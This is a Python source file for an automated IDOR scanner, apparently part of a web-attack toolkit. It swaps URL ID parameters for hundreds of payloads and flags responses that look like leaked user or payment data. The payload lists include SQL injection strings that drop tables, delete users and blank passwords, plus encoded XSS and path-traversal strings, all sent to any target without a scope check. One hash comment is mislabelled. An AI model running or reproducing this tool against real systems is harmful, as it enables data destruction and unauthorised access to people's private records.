#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import random
import urllib.parse
from typing import List, Dict, Optional, Tuple
from modules.core.http_client import HTTPClient
from modules.core.payload_manager import PayloadManager
from core.logger import log_info, log_success, log_warning, log_error, log_debug

class IDORScanner:
    """
    Advanced Insecure Direct Object Reference Scanner
    Supports: Numeric IDs, UUIDs, Base64 encoded IDs, Hash IDs, Hierarchical IDs
    Combined Power: Internal Payloads (200+) + Payload Manager Integration
    """

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.payload_manager = PayloadManager(verbose=verbose)
        self.results = []
        self.payloads_tested = 0
        self.parameters = {}
        self.original_responses = {}

        # ---------- INTERNAL PAYLOADS (200+ FOR SPEED & INDEPENDENCE) ----------
        self.internal_payloads = self._load_internal_payloads()

        # ---------- PAYLOAD MANAGER PAYLOADS (FOR UPDATES) ----------
        self.manager_payloads = self._load_manager_payloads()

        # ---------- COMBINED PAYLOADS ----------
        self.all_payloads = list(set(self.internal_payloads + self.manager_payloads))

        # ---------- SUCCESS INDICATORS ----------
        self.success_indicators = [
            "username", "email", "password", "phone", "mobile", "address",
            "first_name", "last_name", "full_name", "name", "user",
            "profile", "account", "id", "uuid", "token", "api_key",
            "secret", "key", "auth", "session", "cookie", "jwt",
            "admin", "root", "superuser", "moderator", "staff",
            "credit_card", "card_number", "cvv", "expiry",
            "order", "transaction", "payment", "invoice", "receipt",
            "message", "chat", "conversation", "comment", "post",
            "file", "document", "image", "photo", "avatar",
            "product", "price", "stock", "inventory", "warehouse",
            "customer", "client", "partner", "vendor", "supplier",
            "employee", "manager", "director", "ceo", "founder",
            "data", "info", "details", "settings", "preferences"
        ]

        # Parameter patterns to test
        self.id_patterns = [
            r'id', r'user', r'uid', r'uuid', r'pid', r'page', r'cat',
            r'article', r'news', r'blog', r'post', r'comment',
            r'order', r'invoice', r'receipt', r'transaction',
            r'product', r'item', r'sku', r'upc', r'ean',
            r'account', r'profile', r'customer', r'client',
            r'file', r'doc', r'document', r'image', r'photo',
            r'msg', r'message', r'chat', r'conversation'
        ]

    def _load_internal_payloads(self) -> List[str]:
        """Internal payloads (200+ for speed and independence)"""
        payloads = []

        # ----- NUMERIC ID MANIPULATION -----
        numeric = [
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10",
            "100", "1000", "10000", "999", "9999", "99999",
            "-1", "-2", "-10", "-100", "-1000",
            "1.0", "1.1", "1.5", "2.0",
            "01", "001", "0001", "00001",
            "1%00", "1%20", "1%0a", "1%0d",
            "1//", "1/../", "1%2f", "1%2e%2e%2f",
            "1?param=1", "1&param=1", "1#param=1",
            "1;param=1", "1,param=1", "1|param=1",
            "1=1", "1+1", "1-1", "1*1", "1/1",
            "1'", "1\"", "1`", "1;", "1#",
            "1 and 1=1", "1 or 1=1", "1 union select 1",
            "1 order by 1", "1 group by 1", "1 having 1=1",
            "1 like 1", "1 regexp 1", "1 rlike 1"
        ]
        payloads.extend(numeric)

        # ----- UUID PAYLOADS -----
        uuid_payloads = [
            "00000000-0000-0000-0000-000000000000",
            "11111111-1111-1111-1111-111111111111",
            "22222222-2222-2222-2222-222222222222",
            "33333333-3333-3333-3333-333333333333",
            "44444444-4444-4444-4444-444444444444",
            "55555555-5555-5555-5555-555555555555",
            "66666666-6666-6666-6666-666666666666",
            "77777777-7777-7777-7777-777777777777",
            "88888888-8888-8888-8888-888888888888",
            "99999999-9999-9999-9999-999999999999",
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
            "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
            "cccccccc-cccc-cccc-cccc-cccccccccccc",
            "dddddddd-dddd-dddd-dddd-dddddddddddd",
            "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
            "123e4567-e89b-12d3-a456-426614174000",
            "98765432-10ab-cdef-1234-567890abcdef",
            "abcdef01-2345-6789-abcd-ef0123456789"
        ]
        payloads.extend(uuid_payloads)

        # ----- BASE64 ENCODED IDS -----
        base64_payloads = [
            "MQ==", "Mg==", "Mw==", "NA==", "NQ==", "Ng==", "Nw==", "OA==", "OQ==", "MTA=",
            "MTE=", "MTI=", "MTM=", "MTQ=", "MTU=", "MTY=", "MTc=", "MTg=", "MTk=", "MjA=",
            "MTAw", "MTAwMA==", "MTAwMDA=", "OTk5", "OTk5OQ==", "OTk5OTk=",
            "LTE=", "LTI=", "LTEw", "LTEwMA==", "LTEwMDA=",
            "MS4w", "MS4x", "MS41", "Mi4w",
            "MDE=", "MDAx", "MDAwMQ==", "MDAwMDE="
        ]
        payloads.extend(base64_payloads)

        # ----- HEX ENCODED IDS -----
        hex_payloads = [
            "0x1", "0x2", "0x3", "0x4", "0x5", "0x6", "0x7", "0x8", "0x9", "0xA",
            "0xB", "0xC", "0xD", "0xE", "0xF", "0x10", "0x20", "0x30", "0x40", "0x50",
            "0x64", "0x100", "0x1000", "0x2710", "0x3E8", "0x3E7", "0x3E9",
            "0xFFFFFFFF", "0xFFFFFFFFFFFFFFFF",
            "0x1%00", "0x1%20", "0x1%0a", "0x1%0d"
        ]
        payloads.extend(hex_payloads)

        # ----- HASH PAYLOADS (MD5, SHA1, SHA256) -----
        hash_payloads = [
            "5f4dcc3b5aa765d61d8327deb882cf99",  # password
            "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8",  # password (sha1)
            "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",  # password (sha256)
            "7c6a180b36896a0a8c02787eeafb0e4c",  # admin
            "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",  # admin (sha256)
            "21232f297a57a5a743894a0e4a801fc3",  # admin (md5)
            "123456", "654321", "qwerty", "abc123", "letmein",
            "monkey", "dragon", "baseball", "master", "sunshine",
            "iloveyou", "trustno1", "1234567", "password1", "12345678",
            "123456789", "1234567890", "admin123", "root123", "user123"
        ]
        payloads.extend(hash_payloads)

        # ----- HIERARCHICAL ID MANIPULATION -----
        hierarchical = [
            "1/2", "1/2/3", "1/2/3/4", "1/2/3/4/5",
            "1.2", "1.2.3", "1.2.3.4", "1.2.3.4.5",
            "1-2", "1-2-3", "1-2-3-4", "1-2-3-4-5",
            "1:2", "1:2:3", "1:2:3:4", "1:2:3:4:5",
            "1_2", "1_2_3", "1_2_3_4", "1_2_3_4_5",
            "1;2", "1;2;3", "1;2;3;4", "1;2;3;4;5",
            "1|2", "1|2|3", "1|2|3|4", "1|2|3|4|5"
        ]
        payloads.extend(hierarchical)

        # ----- ENCODED PAYLOADS -----
        encoded = [
            "1%00", "1%0a", "1%0d", "1%20", "1%2f", "1%2e%2e%2f",
            "1%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e",
            "1%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E",
            "1%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e",
            "1'%20OR%20'1'='1",
            "1'%20OR%201=1--",
            "1'%20AND%201=1--",
            "1'%20AND%201=2--",
            "1'%20UNION%20SELECT%20NULL--",
            "1'%20UNION%20SELECT%20NULL,NULL--",
            "1'%20UNION%20SELECT%20NULL,NULL,NULL--",
            "1%3B%20DROP%20TABLE%20users--",
            "1%3B%20DELETE%20FROM%20users--",
            "1%3B%20UPDATE%20users%20SET%20password%3D''--",
            "1%3B%20INSERT%20INTO%20users%20VALUES%28''%29--"
        ]
        payloads.extend(encoded)

        # ----- ARRAY/BULK ID PAYLOADS -----
        array_payloads = [
            "1,2,3,4,5", "1,2,3,4,5,6,7,8,9,10",
            "1,1,1,1,1,1,1,1,1,1",
            "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
            "1:2:3:4:5", "1;2;3;4;5", "1|2|3|4|5",
            "1&2&3&4&5", "1+2+3+4+5", "1-2-3-4-5",
            "1_2_3_4_5", "1.2.3.4.5", "1/2/3/4/5",
            "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
            "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40"
        ]
        payloads.extend(array_payloads)

        # ----- NULL BYTE PAYLOADS -----
        null_byte = [
            "1%00", "1%00%00", "1%00%00%00",
            "1%00%00%00%00", "1%00%00%00%00%00",
            "1%00'", "1%00\"", "1%00%0a", "1%00%0d",
            "1%00%20", "1%00%2f", "1%00%2e%2e%2f"
        ]
        payloads.extend(null_byte)

        return list(set(payloads))

    def _load_manager_payloads(self) -> List[str]:
        """Load payloads from Payload Manager"""
        payloads = []
        tags = ["numeric", "uuid", "base64", "hex", "hash", "hierarchical", "encoded", "array"]
        for tag in tags:
            results = self.payload_manager.get_payloads("idor", tags=[tag], limit=50)
            for p in results:
                if 'value' in p:
                    payloads.append(p['value'])
        return list(set(payloads))

    def extract_params(self) -> Dict:
        parsed = urllib.parse.urlparse(self.target)
        if not parsed.query:
            return {}
        return urllib.parse.parse_qs(parsed.query)

    def build_url(self, params: Dict) -> str:
        parsed = urllib.parse.urlparse(self.target)
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def get_original_response(self, param: str, original_value: str) -> Optional[str]:
        """Get the original response for a parameter to compare against"""
        params = self.extract_params()
        params[param] = [original_value]
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if resp:
            return resp.text
        return None

    def test_idor(self, param: str, original_value: str, test_value: str) -> bool:
        """Test a single IDOR payload"""
        params = self.extract_params()
        if param in params:
            params[param] = [test_value]
        else:
            params[param] = test_value
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if not resp:
            return False

        self.payloads_tested += 1

        # Get original response if not already stored
        if param not in self.original_responses:
            self.original_responses[param] = self.get_original_response(param, original_value)

        original = self.original_responses.get(param, "")

        # Check if response is different from original
        if resp.text != original:
            # Check for sensitive data indicators
            for indicator in self.success_indicators:
                if indicator.lower() in resp.text.lower():
                    # Check if the response contains different content
                    if len(resp.text) != len(original) or resp.text[:100] != original[:100]:
                        result = {
                            "param": param,
                            "original_value": original_value,
                            "tested_value": test_value,
                            "url": test_url,
                            "indicator": indicator,
                            "status": resp.status_code,
                            "content_length": len(resp.text),
                            "preview": resp.text[:200].replace('\n', ' ').strip()
                        }
                        self.results.append(result)
                        log_success(f"IDOR found: {test_url} (indicator: {indicator})")
                        return True

        return False

    def run(self) -> Dict:
        log_info(f"Starting IDOR scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning("No GET parameters found. IDOR scan works best with parameters like ?id=1")
            return {
                "target": self.target,
                "scan_type": "idor",
                "total_params": 0,
                "vulnerable_count": 0,
                "vulnerabilities": [],
                "payloads_tested": 0
            }

        log_info(f"Found {len(params)} parameter(s): {', '.join(params.keys())}")
        log_info(f"Testing {len(self.all_payloads)} payloads (Internal: {len(self.internal_payloads)} + Manager: {len(self.manager_payloads)})")

        target_params = []
        for p in params.keys():
            for pattern in self.id_patterns:
                if pattern in p.lower():
                    target_params.append(p)
                    break
        if not target_params:
            target_params = list(params.keys())[:3]

        for param in target_params:
            original_value = params[param][0] if params[param] else "1"
            log_info(f"Testing parameter: {param} (original: {original_value})")
            shuffled = self.all_payloads.copy()
            random.shuffle(shuffled)
            for payload in shuffled[:100]:  # Limit to 100 per parameter for speed
                if self.test_idor(param, original_value, payload):
                    if self.verbose:
                        log_info("Found vulnerability, continuing to test for more...")

        log_success(f"IDOR scan completed. Found {len(self.results)} vulnerabilities.")
        return {
            "target": self.target,
            "scan_type": "idor",
            "total_params": len(params),
            "total_payloads_tested": min(len(self.all_payloads), 100) * len(target_params),
            "payloads_internal": len(self.internal_payloads),
            "payloads_manager": len(self.manager_payloads),
            "vulnerable_count": len(self.results),
            "vulnerabilities": self.results
        }
